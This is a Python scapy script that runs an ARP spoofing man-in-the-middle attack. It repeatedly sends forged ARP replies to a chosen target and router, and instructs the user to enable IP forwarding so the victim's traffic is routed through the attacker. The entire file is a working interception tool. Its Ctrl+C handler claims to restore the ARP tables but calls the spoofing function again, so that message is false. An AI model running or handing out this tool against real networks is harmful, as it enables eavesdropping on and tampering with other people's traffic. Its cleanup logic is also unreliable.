#! usr/bin/env python
import optparse
import sys
import time

import scapy.all as scapy

print("Please run bellow command to flow packet from your system: echo 1 > /proc/sys/net/ipv4/ip_forward")


def get_argument():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip",
                      help="Give target IP address to change router MAC-Address in router IP-table")
    parser.add_option("-r", "--router", dest="router_ip",
                      help="Give router IP address to change target MAC-Address in router IP-table")
    (option, argument) = parser.parse_args()
    if not option.target_ip:
        parser.error("[-] Please specify TARGET, use --help for more info.")
    elif not option.router_ip:
        parser.error("[-] Please specify ROUTER, use --help for more info.")
    else:
        return option


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(packet, count=4, verbose=False)


# scan("192.168.40.130")
counter = 0

option = get_argument()
target_ip = option.target_ip
router_ip = option.router_ip

try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        counter += 2
        print("\r[+]Send Packet: " + str(counter)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+]Detected CTR + C......Restoring ARP Table......Please Wait.")
    spoof(target_ip, router_ip)
    spoof(router_ip, target_ip)
